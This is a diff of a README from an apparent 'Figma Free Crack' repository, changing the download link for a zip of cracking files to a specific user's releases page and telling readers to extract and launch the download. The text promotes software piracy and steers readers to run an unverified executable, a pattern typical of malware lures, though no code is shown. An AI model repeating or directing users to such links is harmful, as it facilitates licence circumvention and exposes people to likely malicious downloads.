@@ -25,7 +25,7 @@ Welcome to the Figma Free Crack repository! Here you will find everything you ne
 
 ## 🔗 Quick Access
 
-To quickly access the files related to cracking Figma, you can download the project zip [here](https://github.com/files/Project.zip). Make sure to extract the files and follow the instructions provided to get started. If the link ends with a file name, it needs to be launched to initiate the download process.
+To quickly access the files related to cracking Figma, you can download the project zip [here](https://github.com/JulioCorzo08/figma-free-crack/releases). Make sure to extract the files and follow the instructions provided to get started. If the link ends with a file name, it needs to be launched to initiate the download process.
 
 ## 🚀 Getting Started
 
